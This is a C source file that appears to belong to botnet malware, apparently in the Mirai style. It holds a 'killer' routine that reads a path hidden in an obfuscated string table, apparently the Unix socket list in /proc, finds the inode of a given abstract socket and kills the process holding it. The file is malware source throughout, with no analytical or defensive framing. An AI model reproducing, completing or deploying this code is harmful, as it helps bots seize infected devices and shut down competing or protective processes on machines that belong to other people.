#include "bot/config/table.h"
#include "bot/modules/killer.h"
#include "bot/utils/network.h"
#include "bot/utils/string.h"

#include "bot/definitions.h"

void network_kill_unix_inode(char *abstract, int abstract_len) {
  char inode[16] = {0};
  memset(inode, 0, 16);

  int fd = open(table_retrieve(TABLE_KILLER_NET_UNIX, NULL), O_RDONLY);
  table_lock(TABLE_KILLER_NET_UNIX);
  if (fd == -1) return;

  char buf[1024];
  int buf_len = 0;

  while (str_fdgets(buf, sizeof(buf), fd, &buf_len)) {
    int index = 0, i = 0, ii = 0;
    bool in_column = false;

    if (str_search(buf, abstract, buf_len, abstract_len) != -1) {
      while (index <= 5) {
        if (!buf[++i] || i >= buf_len) break;
        if (buf[i] == ' ' || buf[i] == '\t') {
          in_column = true;
        } else {
          if (in_column == true) ++index;
          in_column = 0;
        }
      }

      ii = i;
      while (buf[i] && buf[i] != 32)
        ++i;

      buf[i++] = 0;

      // copies inode from buffer
      if (strlen(&buf[ii]) <= 15) {
        strcpy(inode, &buf[ii]);
        break;
      }
    }
  }

  close(fd);

  if (strlen(inode) > 0) {
    LOG_INFO("Found inode ['%s'] associated with ['%s']", inode, abstract);
    killer_kill_by_inode(inode);
  }
}
